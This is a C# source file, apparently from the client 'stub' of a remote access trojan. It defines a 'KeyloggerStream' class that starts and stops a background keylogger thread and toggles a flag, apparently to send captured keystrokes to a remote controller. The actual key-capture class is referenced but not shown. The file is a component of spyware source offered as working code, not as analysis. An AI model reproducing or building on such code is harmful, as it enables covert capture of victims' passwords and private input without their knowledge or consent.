using System.Security.Permissions;
using System.Threading;

namespace VanillaStub.Helpers.Services;

public static class KeyloggerStream
{
	private static readonly Keylogger K = new Keylogger();

	private static Thread KeyloggerThread = new Thread(StartKeylogger);

	private static bool KeyloggerActive { get; set; }

	[SecurityPermission(SecurityAction.Demand, ControlThread = true)]
	public static void Start()
	{
		if (!KeyloggerActive)
		{
			KeyloggerActive = true;
			Keylogger.SendKeys = true;
			try
			{
				KeyloggerThread.Start();
			}
			catch
			{
			}
		}
	}

	[SecurityPermission(SecurityAction.Demand, ControlThread = true)]
	public static void Stop()
	{
		if (KeyloggerActive)
		{
			KeyloggerActive = false;
			Keylogger.SendKeys = false;
			try
			{
				KeyloggerThread.Abort();
				KeyloggerThread = new Thread(StartKeylogger);
			}
			catch
			{
			}
		}
	}

	private static void StartKeylogger()
	{
		K.InitKeylogger();
	}
}
